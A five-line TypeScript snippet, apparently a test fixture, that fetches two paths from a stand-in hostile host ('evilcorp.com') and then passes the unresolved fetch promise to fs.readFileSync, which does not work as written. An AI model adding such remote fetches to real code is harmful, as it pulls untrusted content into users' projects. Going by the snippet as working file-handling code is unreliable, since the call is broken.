import * as fs from 'fs';

const files = [fetch('https://evilcorp.com/hacky'), fetch('https://evilcorp.com/hacky-hacky')];

const fileContents = fs.readFileSync(files[0]);
